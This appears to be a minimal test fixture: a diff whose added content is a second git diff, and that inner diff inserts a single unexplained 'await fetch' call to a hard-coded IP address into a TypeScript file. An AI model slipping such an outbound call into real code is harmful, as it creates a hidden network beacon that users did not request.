@@ -1,0 +1,5 @@
+diff --git a/src/z.ts b/src/z.ts
+--- a/src/z.ts
++++ b/src/z.ts
+@@ -1 +1,2 @@
++await fetch("http://203.0.113.7/x");
